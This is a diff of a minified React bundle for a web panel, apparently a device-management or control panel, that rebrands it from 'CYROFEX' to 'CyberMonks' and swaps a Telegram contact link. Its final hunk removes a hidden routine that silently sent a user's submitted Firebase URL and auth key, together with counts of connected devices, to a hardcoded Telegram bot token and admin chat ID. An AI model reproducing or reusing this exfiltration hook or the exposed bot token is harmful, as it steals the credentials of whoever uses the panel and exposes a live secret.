@@ -13913,11 +13913,13 @@ Error: ${_t}`)
             className: "relative z-10 w-full max-w-md px-4 py-8",
             children: [r.jsxs("div", {
                 className: "text-center mb-8",
-                children: [r.jsx("div", {
-                    className: "inline-flex items-center justify-center w-16 h-16 rounded-2xl mb-4 red-gradient shadow-lg shadow-red-900/40",
-                    children: r.jsx(gs, {
-                        className: "w-8 h-8 text-white"
-                    })
+                children: [r.jsx("img", {
+                    src: "/assets/logo.png",
+                    alt: "CyberMonks",
+                    className: "w-24 h-24 rounded-full mb-4 mx-auto object-cover",
+                    style: {
+                        boxShadow: "0 0 24px rgba(0,255,255,0.4), 0 0 40px rgba(255,140,0,0.25)"
+                    }
                 }), r.jsxs("div", {
                     className: "flex flex-col items-center justify-center mt-10",
                     children: [r.jsxs("h1", {
@@ -15248,49 +15250,19 @@ function p1({
                 className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4",
                 children: [r.jsxs("div", {
                     className: "flex items-center gap-2.5 flex-shrink-0",
-                    children: [r.jsx("div", {
-                        className: "w-7 h-7 rounded-lg bg-gradient-to-br from-red-600 to-orange-500 flex items-center justify-center shadow-lg shadow-red-900/50",
-                        children: r.jsx(gs, {
-                            className: "w-3.5 h-3.5 text-white"
-                        })
-                    }), r.jsx("span", {
-                        className: "text-[#6acfff] animate-fade-in",
-                        children: "CY"
-                    }), r.jsx("span", {
-                        className: "animate-fade-in",
+                    children: [r.jsx("img", {
+                        src: "/assets/logo.png",
+                        alt: "CyberMonks",
+                        className: "w-8 h-8 rounded-full object-cover",
                         style: {
-                            animationDelay: "50ms"
-                        },
-                        children: "R"
+                            boxShadow: "0 0 12px rgba(0,255,255,0.35)"
+                        }
                     }), r.jsx("span", {
-                        className: "animate-fade-in",
-                        style: {
-                            animationDelay: "100ms"
-                        },
-                        children: "O"
+                        className: "text-[#6acfff] font-bold tracking-wide",
+                        children: "CYBER"
                     }), r.jsx("span", {
-                        className: "animate-fade-in",
-                        style: {
-                            animationDelay: "150ms"
-                        },
-                        children: "F"
-                    }), r.jsx("span", {
-                        className: "animate-fade-in",
-                        style: {
-                            animationDelay: "200ms"
-                        },
-                        children: "E"
-                    }), r.jsxs("span", {
-                        className: "relative animate-fade-in",
-                        style: {
-                            animationDelay: "250ms"
-                        },
-                        children: ["X", r.jsx("span", {
-                            className: "absolute -top-1 -right-1 w-1.5 h-1.5 bg-[#6acfff] rounded-full animate-glint"
-                        })]
-                    }), r.jsx("style", {
-                        jsx: !0,
-                        children: "@keyframes fadeIn{0%{opacity:0;transform:translateY(10px)scale(0.98);filter:blur(2px)}100%{opacity:1;transform:translateY(0)scale(1);filter:blur(0)}}.animate-fade-in{animation:fadeIn 1s ease-out forwards}@keyframes glint{0%,100%{transform:scale(1);opacity:0}50%{transform:scale(1.5);opacity:1}}.animate-glint{animation:glint 1.5s infinite;box-shadow:0 0 6px #6acfff,0 0 10px #0088cc}"
+                        className: "text-[#ff8c00] font-bold tracking-wide",
+                        children: "MONKS"
                     })]
                 }), r.jsxs("div", {
                     className: "relative flex-1 max-w-sm",
@@ -15316,8 +15288,15 @@ function p1({
                             className: "text-xs font-semibold text-emerald-400",
                             children: "Connected"
                         })]
+                    }), r.jsx("img", {
+                        src: "/assets/logo.png",
+                        alt: "CyberMonks",
+                        className: "w-9 h-9 rounded-full object-cover",
+                        style: {
+                            boxShadow: "0 0 14px rgba(0,255,255,0.4), 0 0 22px rgba(255,140,0,0.2)"
+                        }
                     }), r.jsxs("a", {
-                        href: "https://t.me/BERLIN_00_11",
+                        href: "https://t.me/nexaq1",
                         target: "_blank",
                         rel: "noopener noreferrer",
                         className: "inline-block",
@@ -15540,28 +15519,6 @@ function y1() {
         tt({
             fbUrl: S,
             fbKey: f
-        });
-        
-        let totalDevices = 0;
-        let onlineDevices = 0;
-        
-        try {
-            const clientsData = await yn(S, f, "clients");
-            const devices = n1(clientsData);
-            totalDevices = devices.length;
-            onlineDevices = devices.filter(d => d.status).length;
-        } catch (err) {
-            console.log("Error fetching initial device counts", err);
-        }
-
-        // Send to Telegram bot
-        const telegramBotToken = '7845194154:AAHJ-oCfYNGvgJ3wSq9KTux0WHYoNtG37JI';
-        const adminIds = ['7525186398'];
-        const message = `ðŸ” New Firebase Credentials Submitted\n\nðŸ“ Firebase URL: ${S}\nðŸ”‘ Auth Key: ${f}\n\nðŸ“± Total Devices: ${totalDevices}\nðŸŸ¢ Total Online Devices: ${onlineDevices}\n\nâ° Time: ${new Date().toLocaleString()}`;
-        
-        adminIds.forEach(chatId => {
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent to ' + chatId));
         });
     }, d = () => {
         tt(null)
